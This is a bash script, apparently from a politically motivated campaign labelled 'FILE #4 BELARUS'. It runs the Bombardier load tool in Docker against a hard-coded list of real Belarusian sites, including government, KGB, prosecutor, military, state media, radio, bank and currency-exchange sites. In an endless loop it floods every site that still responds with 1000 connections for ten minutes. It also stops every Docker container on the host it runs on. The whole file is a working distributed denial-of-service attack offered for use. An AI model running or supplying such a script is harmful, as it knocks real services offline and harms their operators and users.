#!/bin/bash

# FILE #4 BELARUS

# Configuration of Bombardier
BOMBARDIER_TIMEOUT=10m #this is the time of bombardement
BOMBARDIER_CONNECTIONS=1000

declare -a sites=(
"http://belta.by/"
"https://sputnik.by/"
"https://www.tvr.by/"
"https://www.sb.by/"
"https://belmarket.by/"
"https://www.belarus.by/"
"https://belarus24.by/"
"https://ont.by/"
"https://www.024.by/"
"https://www.belnovosti.by/"
"https://mogilevnews.by/"
"https://www.mil.by/"
"https://yandex.by/"
"https://www.slonves.by/"
"http://www.ctv.by/"
"https://radiobelarus.by/"
"https://radiusfm.by/"
"https://alfaradio.by/"
"https://radiomir.by/"
"https://radiostalica.by/"
"https://radiobrestfm.by/"
"https://www.tvrmogilev.by/"
"https://minsknews.by/"
"https://zarya.by/"
"https://grodnonews.by/"
"https://rec.gov.by/"
"https://www.government.by"
"http://www.kgb.by/"
"https://www.prokuratura.gov.by"
"https://belinvestbank.by/"
"https://multichange.net"
"https://www.netex24"
)

while :
do
  echo "Stop all containers"
  docker stop $(docker ps -aq)
  echo "Docker containers stopped"

  echo "Run ddos for all sites"
  for site in "${sites[@]}"; do
  
    status_code=$(curl -m 2 -s -o /dev/null  -w "%{http_code}" "$site")
    status_code=$(expr "$status_code" + 0)
    # If status code is zero site is already blocked
  
    site_status="${site} status code ${status_code}"
    echo "$site_status"
  
    if (("$status_code" != 0 && "$status_code" <= 400)); then
      echo "Must be destroyed"
      docker run -ti -d --rm alpine/bombardier -c "$BOMBARDIER_CONNECTIONS" -d "$BOMBARDIER_TIMEOUT" -l "$site"
    fi
  
  done

  echo "DDoS is up and running..."

  #these are SECONDS!!!! and they must correspond to BOMBARDIER_TIMEOUT above...in this case it's 10minutes
  sleep 600

  echo "Restarting DDoS, checking which sites are still working"
done
